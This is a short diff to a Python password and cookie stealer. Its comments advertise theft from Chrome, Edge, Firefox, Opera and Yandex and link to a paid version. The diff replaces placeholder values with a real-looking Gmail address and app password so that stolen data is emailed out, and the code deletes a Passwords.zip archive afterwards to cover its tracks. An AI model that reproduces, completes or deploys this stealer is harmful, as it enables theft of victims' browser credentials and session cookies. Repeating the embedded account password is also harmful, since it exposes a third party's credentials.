@@ -19,9 +19,9 @@ from email import encoders
 # Version Professionel : Steal cookie,password : Chrome,Microsoft Edge,Firefox,Opera,Yandex
 # Link to Download https://shoppy.gg/@hakanonymos
 
-addr_from = 'your@gmail.com' # your email to send steal_password
-addr_to  = 'receive email  ' # receive email
-password  = 'password for gmail' # Your gmail password
+addr_from = 'mahmut14331@gmail.com' # your email to send steal_password
+addr_to  = 'mahmut14331@gmail.com  ' # receive email
+password  = 'hjti dmne lrsc dzei' # Your gmail password
 
 from PIL import ImageGrab
 from cryptography.hazmat.backends import default_backend
@@ -232,3 +232,4 @@ server.quit()
 
 attachment.close()
 os.remove('C:\\ProgramData\\Passwords.zip')
+
